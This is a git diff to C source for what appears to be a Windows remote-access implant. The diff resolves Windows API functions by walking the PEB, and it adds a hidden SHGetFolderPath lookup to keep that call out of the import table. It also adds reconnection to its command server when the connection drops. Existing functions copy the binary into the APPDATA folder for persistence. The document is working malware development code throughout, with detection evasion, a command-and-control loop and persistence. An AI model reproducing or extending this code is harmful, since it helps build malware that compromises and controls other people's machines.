@@ -119,6 +119,7 @@ typedef int(WINAPI* CONNECTSOCK)(SOCKET, struct sockaddr*, int);
 typedef int(WINAPI* SENDSOCK)(SOCKET, char*, int, int);
 typedef int(WINAPI* RECVSOCK)(SOCKET, char*, int, int);
 typedef BOOL(WINAPI* SHOWWINDOW)(HWND, int);
+typedef HRESULT(WINAPI* SHGETFOLDERPATH)(HWND, int, HANDLE, DWORD, LPSTR);
 
 // function pointers from pebwalk
 CREATEPROCESSA pCreateProcessA; // kernel32.dll
@@ -135,6 +136,7 @@ CONNECTSOCK pConnect; // Ws2_32.dll
 SENDSOCK pSend; // Ws2_32.dll
 RECVSOCK pRecv; // Ws2_32.dll
 SHOWWINDOW pShowWindow; // User32.dll
+SHGETFOLDERPATH pSHGetFolderPath; // Shell.dll
 
 // These two functions are useful for getting libraries and functions
 // from places besides kernel32
@@ -179,6 +181,7 @@ void GetAPIFromPeb() {
 	HMODULE advapi32Base = NULL;
 	HMODULE ws2_32Base = NULL;
 	HMODULE user32Base = NULL;
+	HMODULE shell32Base = NULL;
 
 #ifdef DO_SPECIAL_PEB_FIND
 
@@ -220,6 +223,11 @@ void GetAPIFromPeb() {
 			user32Base = (HMODULE)module->DllBase;
 		}
 
+
+		if (_stricmp(baseDllName, "Shell32.dll") == 0) {
+			shell32Base = (HMODULE)module->DllBase;
+		}
+
 		listEntry = listEntry->Flink;
 	} while (listEntry != &peb->Ldr->InLoadOrderModuleList);
 
@@ -249,6 +257,8 @@ void GetAPIFromPeb() {
 		if (user32Base == NULL) user32Base = pLoadLibraryA("User32.dll");
 
 		pShowWindow = (SHOWWINDOW)GetProcAddressWalk(user32Base, "ShowWindow");
+
+		if (shell32Base == NULL) shell32Base = pLoadLibraryA("Shell32.dll");
 
 	}
 }
@@ -410,11 +420,17 @@ void attemptFullPersistence(SOCKET* pSockfd, TCHAR* dirName) {
 	// Get name of program
 	name = wcsrchr(dirName, L'\\');
 
-	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
+	pSHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
 
 	wcscat(wszPath, name);
 
 	if (pMoveFileExW(dirName, wszPath, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING) == 0) {
+		DWORD err;
+
+		err = GetLastError();
+
+		ExitProcess(err);
+
 		pSend(*pSockfd, failed, sizeof failed, 0);
 		return;
 	}
@@ -436,7 +452,7 @@ void attemptFullPersistenceNoNetwork(TCHAR* dirName) {
 	// Construct new hidey hole spot
 
 	TCHAR wszPath[MAX_PATH] = L"";
-	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
+	pSHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
 
 	wcscat(wszPath, name);
 
@@ -523,6 +539,7 @@ int main(int argc, char* argv[]) {
 	char commandOpt[50];
 
 	PROCESS_INFORMATION pinfo;
+	int bytesRecv;
 
 	if ((sockfd = connectToServer()) == -1) {
 		ExitProcess(1);
@@ -533,7 +550,15 @@ int main(int argc, char* argv[]) {
 		memset(commandOpt, 0, sizeof commandOpt);
 
 		pSend(sockfd, commandList, sizeof commandList, 0);
-		pRecv(sockfd, commandOpt, sizeof commandOpt, 0);
+		bytesRecv = pRecv(sockfd, commandOpt, sizeof commandOpt, 0);
+
+		// Check for dc
+		if (bytesRecv < 0 || bytesRecv == WSAECONNRESET) {
+			if ((sockfd = connectToServer()) == -1) {
+				ExitProcess(1);
+			}
+			continue;
+		}
 
 		cleanManagerInput(commandOpt, (size_t)sizeof commandOpt);
 
